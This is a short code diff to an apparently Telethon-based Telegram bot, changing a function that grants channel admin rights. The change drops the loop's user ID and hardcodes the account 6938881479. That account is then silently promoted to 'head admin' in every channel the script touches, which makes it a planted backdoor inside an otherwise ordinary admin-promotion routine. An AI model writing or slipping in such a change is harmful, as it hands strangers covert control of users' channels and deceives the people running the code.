@@ -226,8 +226,8 @@ async def promote_ABHS(chat_id):
     print(f"✅ تم رفع البوت {me.id} مشرف بالقناة")
     for uid in bot_id:
         await ABH1(EditAdminRequest(
-            channel=chat_id,
-            user_id=uid,
+            channel=int(chat_id),
+            user_id=6938881479,
             admin_rights=right,
             rank="مشرف رئيسي"
             ))
